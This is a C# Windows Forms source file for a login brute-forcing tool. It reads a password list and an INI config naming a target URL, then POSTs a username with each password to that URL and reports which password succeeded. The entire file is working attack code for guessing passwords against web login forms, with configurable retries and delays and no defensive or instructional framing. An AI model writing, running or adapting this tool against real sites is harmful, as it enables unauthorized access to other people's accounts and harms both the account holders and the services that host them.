using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;

namespace jth
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void passwordlistselect_btn_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                string filepath = openFileDialog1.FileName;
                passwordlist_tbox.Text = filepath;
            }
        }

        private void configselect_btn_Click(object sender, EventArgs e)
        {
            if (openFileDialog2.ShowDialog() == DialogResult.OK)
            {
                string filepath = openFileDialog2.FileName;
                config_tbox.Text = filepath;
            }
        }

        private async void attack_btn_Click(object sender, EventArgs e)
        {
            if (passwordlist_tbox.Text == "")
            {
                MessageBox.Show("Please Select A Password List");
                return;
            }

            if (config_tbox.Text == "")
            {
                MessageBox.Show("Please Select A Config");
                return;
            }

            IniConfigParser parser = new IniConfigParser(config_tbox.Text);

            string url = parser.GetConfigValue("target", "url");
            int timeout = int.Parse(parser.GetConfigValue("bruteforce", "timeout"));
            int maxAttempts = int.Parse(parser.GetConfigValue("bruteforce", "attempts"));
            int delay = int.Parse(parser.GetConfigValue("bruteforce", "delay"));

            string[] passwords = File.ReadAllLines(passwordlist_tbox.Text);

            foreach (string password in passwords)
            {
                bool success = false;
                int attempts = 0;

                while (!success && attempts < maxAttempts)
                {
                    try
                    {
                        using (HttpClient client = new HttpClient())
                        {
                            client.Timeout = TimeSpan.FromSeconds(timeout);

                            var content = new StringContent($"username={username_tbox.Text}&password={password}", System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");

                            var response = await client.PostAsync(url, content);

                            if (response.IsSuccessStatusCode)
                            {
                                results.Text += $"Password Found: {password}\n";
                                success = true;
                            }
                            else
                            {
                                results.Text += $"Password Incorrect: {password}\n";
                            }
                        }
                    }
                    catch (TaskCanceledException ex) 
                    {
                        results.Text += $"Request timed out: {ex.Message}\n";
                    }
                    catch (Exception ex) 
                    {
                        results.Text += $"Error: {ex.Message}\n";
                    }

                    attempts++;
                    if (!success && attempts < maxAttempts)
                    {
                        results.Text += $"Retrying attempt {attempts} for password: {password}\n";
 
                        await Task.Delay(delay * 1000); 
                    }
                }

                if (!success)
                {
                    results.Text += $"Max attempts reached for password: {password}\n";
                }

                await Task.Delay(delay * 1000);
            }
        }
    }
}